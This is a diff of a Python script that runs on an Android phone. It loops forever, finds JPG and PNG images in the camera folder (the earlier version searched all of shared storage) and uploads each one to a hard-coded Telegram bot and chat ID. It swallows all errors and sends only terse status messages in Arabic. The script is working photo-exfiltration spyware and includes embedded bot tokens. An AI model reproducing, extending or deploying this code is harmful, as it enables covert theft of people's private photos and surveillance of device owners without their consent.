@@ -2,55 +2,62 @@ import os
 import time
 import requests
 
-BOT_TOKEN = "7820129712:AAH9pZ49S_m8tY8965625902"
-CHAT_ID = "6110903337"
+BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
+CHAT_ID = "7084557369"
 
-sent_files = set()
+FOLDER = "/storage/emulated/0/DCIM/Camera"
+sent = set()
 
 def send_msg(text):
     try:
-        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                      data={"chat_id": CHAT_ID, "text": text}, timeout=10)
-    except: pass
+        requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            data={"chat_id": CHAT_ID, "text": text},
+            timeout=10
+        )
+    except:
+        pass
 
-def send_doc(path):
+def send_file(path):
     try:
         with open(path, "rb") as f:
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-            r = requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f}, timeout=60)
+            r = requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
+                data={"chat_id": CHAT_ID},
+                files={"document": f},
+                timeout=120
+            )
         return r.status_code == 200
-    except: return False
+    except:
+        return False
 
-def deep_scan():
-    # الفحص الشامل لجميع المجلدات لتفادي مشكلة اختلاف المسارات
-    base_path = "/storage/emulated/0/"
-    count = 0
-    
-    for root, dirs, files in os.walk(base_path):
-        # تجنب مجلدات النظام لعدم البطء
-        if "Android" in root:
+def scan():
+    if not os.path.exists(FOLDER):
+        return
+
+    files = [
+        os.path.join(FOLDER, f)
+        for f in os.listdir(FOLDER)
+        if f.lower().endswith((".jpg", ".jpeg", ".png"))
+    ]
+
+    files.sort(key=os.path.getmtime)
+
+    for path in files:
+        if path in sent:
             continue
-            
-        for file in files:
-            if count >= 20: return # إرسال 20 صورة في كل دورة (10 ثوانٍ)
-            
-            if file.lower().endswith((".jpg", ".jpeg", ".png")):
-                path = os.path.join(root, file)
-                
-                if path not in sent_files:
-                    if send_doc(path):
-                        sent_files.add(path)
-                        count += 1
-                        time.sleep(1.5) # تأخير بسيط لراحة البوت
+
+        if send_file(path):
+            sent.add(path)
+            time.sleep(5)
 
 def main():
-    time.sleep(5)
-    send_msg("🚀 بدء خدمة الفحص الشامل (Deep Scan)")
-    
+    time.sleep(10)
+    send_msg("🚀 الخدمة اشتغلت")
+
     while True:
-        deep_scan()
-        # الانتظار 10 ثوانٍ قبل الدورة القادمة
-        time.sleep(10)
+        scan()
+        time.sleep(60)
 
 if __name__ == "__main__":
     main()
